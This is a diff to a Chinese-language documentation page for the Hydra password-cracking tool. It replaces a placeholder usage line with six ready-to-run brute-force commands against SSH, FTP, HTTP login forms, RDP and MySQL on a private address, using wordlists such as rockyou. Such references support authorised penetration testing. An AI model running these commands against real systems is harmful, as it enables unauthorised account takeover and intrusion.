@@ -11,8 +11,23 @@
 
 ## 命令示例
 ```bash
-# 基本用法
-hydra [参数]
+# SSH 暴力破解（单用户）
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+# FTP 暴力破解（用户名列表）
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100
+
+# HTTP POST 表单暴力破解
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# 多线程 SSH 爆破
+hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100
+
+# RDP 暴力破解
+hydra -l administrator -P passwords.txt rdp://192.168.1.100
+
+# MySQL 暴力破解
+hydra -l root -P passwords.txt mysql://192.168.1.100
 ```
 
 ## 使用场景
